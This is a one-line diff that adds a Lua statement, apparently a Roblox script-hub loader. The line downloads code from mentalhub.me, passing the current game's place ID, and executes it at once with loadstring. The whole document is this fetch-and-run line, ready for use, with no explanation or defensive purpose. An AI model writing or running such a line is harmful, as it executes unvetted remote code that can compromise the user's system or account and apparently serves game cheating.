@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://mentalhub.me/loader?gameid="..game.PlaceId))()
